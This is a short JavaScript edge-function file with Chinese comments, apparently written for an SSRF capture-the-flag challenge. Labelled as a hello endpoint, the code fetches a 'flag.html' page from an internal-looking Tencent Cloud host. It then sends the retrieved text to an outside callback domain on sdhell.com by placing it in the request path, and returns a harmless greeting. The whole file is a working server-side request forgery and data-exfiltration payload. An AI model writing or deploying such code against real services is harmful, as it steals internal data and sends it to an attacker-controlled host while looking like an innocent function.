// edge-functions/api/hello.js

export default async function onRequest(context) { // 注意：使用 async 函数
  try {
    // 步骤 1 & 2: 使用 fetch 获取第一个 URL 的响应文本
    const response1 = await fetch("http://ssrf.tencentcloud.com/flag.html");
    
    if (!response1.ok) {
      throw new Error(`HTTP error! status: ${response1.status}`);
    }
    
    const text = await response1.text();
    console.log("Fetched text:", text); // 可选：打印获取到的文本用于调试

    // 步骤 3: 使用获取到的文本构建第二个 URL 并发起请求
    const targetUrl = `https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/${encodeURIComponent(text)}`; // 使用 encodeURIComponent 更安全
    const response2 = await fetch(targetUrl);

    if (!response2.ok) {
       // 可选：处理第二个请求的错误
       console.error(`Second request failed with status: ${response2.status}`);
       // 或者根据需要返回不同的响应
    }

    // 返回最终的响应
    return new Response("Hello from Edge Functions!"); // 或者可以返回 response2 的内容等

  } catch (error) {
    console.error("Error in onRequest:", error);
    // 可以选择返回一个错误响应给客户端
    return new Response("Internal Server Error", { status: 500 });
  }
}